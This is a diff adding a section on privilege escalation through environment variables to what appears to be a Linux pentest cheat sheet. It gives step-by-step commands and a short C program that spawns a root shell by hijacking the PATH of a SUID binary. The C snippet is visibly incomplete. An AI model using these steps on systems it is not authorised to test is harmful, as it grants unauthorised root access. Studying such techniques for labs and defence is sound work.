@@ -175,6 +175,26 @@ void_init(){
 - Resources: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
 
 **Escalation via Environment Variables**
+- Search for the application/executable file with root permission
+  - `find / -type f -perm -u=s 2>/dev/null`
+- View the strings from the executable file
+  - `strings /usr/local/bin/suid-env`
+  - There might be the line like "service apache2 start" but if the full path is not given for the service, we can overwrite the service with new environment variable.
+  - Create a script in C. 
+  ```C
+  int main() {
+  	setuid(0);
+	system("/bin/bash -p");
+  ```
+- Make it executable
+  - `gcc -o service service.c`
+- View the environment variables
+  - `echo $PATH`
+- Append a new path which is current directory.
+  - `export PATH=/home/user/a-path-where-service.c-file-is-located:$PATH` 
+- Run the executable
+  - `/usr/local/bin/suid-env`
+  - We will get a escalated shell.
 
 ## Escalation Path: Capabilities
 
